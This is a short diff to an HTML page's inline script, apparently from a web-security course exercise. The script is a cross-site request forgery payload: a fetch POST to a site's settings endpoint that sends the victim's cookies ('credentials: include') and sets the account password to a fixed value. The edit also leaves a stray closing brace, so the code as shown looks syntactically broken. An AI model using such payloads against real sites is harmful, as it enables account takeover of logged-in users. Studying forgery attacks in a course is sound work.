@@ -6,8 +6,7 @@
     <script>
         fetch("https://cats.is-course.ru/settings", {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
+          credentials: 'include'
           },
           body: "password=Password%21%21%21%211111&confirm-password=Password%21%21%21%211111"
         });
